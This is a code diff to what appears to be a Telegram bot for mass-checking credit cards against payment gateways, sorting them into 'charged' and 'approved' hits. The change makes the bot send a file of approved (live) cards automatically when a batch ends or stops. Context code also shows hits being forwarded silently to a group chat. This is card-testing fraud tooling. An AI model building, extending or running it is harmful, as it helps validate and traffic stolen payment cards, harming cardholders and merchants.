@@ -89,7 +89,7 @@ def _selection_keyboard(sel_id: str, charged: bool, approved: bool) -> InlineKey
     ])
 
 
-async def show_selection(message, cards, check_fn, gateway, user_id, user_obj, prefix, plan_name, extra_stats_fn=None, max_workers=30):
+async def show_selection(message, cards, check_fn, gateway, user_id, user_obj, prefix, plan_name, extra_stats_fn=None, max_workers=30, auto_send_approved=False):
     """Show the charged/approved selection window before starting a batch check."""
     sel_id = "".join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=8))
     BATCH_PENDING[sel_id] = {
@@ -104,6 +104,7 @@ async def show_selection(message, cards, check_fn, gateway, user_id, user_obj, p
         "approved": False,
         "extra_stats_fn": extra_stats_fn,
         "max_workers": max_workers,
+        "auto_send_approved": auto_send_approved,
     }
     msg = await safe_reply(message, 
         _selection_text(True, False, len(cards)),
@@ -145,6 +146,7 @@ async def handle_selection_callback(callback: types.CallbackQuery, callback_data
             send_charged=charged, send_approved=approved,
             extra_stats_fn=pending.get("extra_stats_fn"),
             max_workers=pending.get("max_workers", 30),
+            auto_send_approved=pending.get("auto_send_approved", False),
         ))
         return
     charged = pending.get("charged", True)
@@ -355,6 +357,24 @@ def generate_result_file_content(session, result_type):
     return buf, filename, len(cards)
 
 
+async def auto_send_approved_file(session, bot):
+    """Send the approved .txt file once a batch ends (natural end or stop)."""
+    if not session.get("auto_send_approved"):
+        return
+    cards = session.get("approved_cards", [])
+    if not cards:
+        return
+    try:
+        buf, filename, count = generate_result_file_content(session, "live")
+        file_content = buf.read()
+        document = types.BufferedInputFile(file=file_content, filename=filename)
+        caption = f"𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 𝗖𝗮𝗿𝗱𝘀 ➠ <b>{count}</b>\n𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➠ {session.get('gateway', '')}"
+        await bot.send_document(chat_id=session["chat_id"], document=document,
+                                caption=caption, parse_mode="HTML")
+    except Exception as e:
+        logging.error(f"[BATCH] auto-send approved file error: {e}")
+
+
 # prefix -> group chat id that silently receives charged/approved hits (pinned there)
 GATE_GROUP_LOG = {}
 
@@ -399,7 +419,7 @@ async def send_gif_result(bot, user_obj, card, response, brand, bin_data, gatewa
                 logging.warning(f"[BATCH] pin to group failed: {e}")
 
 
-async def run_batch_check(message, cards, check_fn, gateway, user_id, user_obj, prefix, plan_name, send_charged=True, send_approved=False, extra_stats_fn=None, max_workers=30):
+async def run_batch_check(message, cards, check_fn, gateway, user_id, user_obj, prefix, plan_name, send_charged=True, send_approved=False, extra_stats_fn=None, max_workers=30, auto_send_approved=False):
     """
     Full mass checker matching the shopify (msh) mass-gate result flow:
     - semaphore(30) concurrency (never checks all cards at once)
@@ -438,6 +458,7 @@ async def run_batch_check(message, cards, check_fn, gateway, user_id, user_obj, 
         "tasks": [],
         "send_charged": send_charged,
         "send_approved": send_approved,
+        "auto_send_approved": auto_send_approved,
         "active_workers": 0,
         "extra_stats_fn": extra_stats_fn,
         "last_entry": "",
@@ -574,6 +595,9 @@ async def run_batch_check(message, cards, check_fn, gateway, user_id, user_obj, 
         session["status"] = "𝗦𝘂𝗺𝗺𝗮𝗿𝘆"
     await update_progress()
 
+    # approved.txt goes out once the batch ends (natural completion)
+    await auto_send_approved_file(session, bot)
+
 
 async def handle_result_callback(callback: types.CallbackQuery):
     """Send the result .txt file for a category. callback.data = <prefix>_res_<sid>_<type>."""
@@ -703,6 +727,9 @@ async def handle_stop_callback(callback: types.CallbackQuery):
         await callback.message.edit_text(text=text, parse_mode="HTML", reply_markup=get_result_buttons(session["prefix"], session_id, session, is_running=False))
     except Exception as e:
         logging.error(f"[BATCH] stop edit error: {e}")
+
+    # approved.txt goes out on stop too (user/bot stopped)
+    await auto_send_approved_file(session, callback.bot)
 
 
 # ── Shared selection router (registered once in main.py) ──
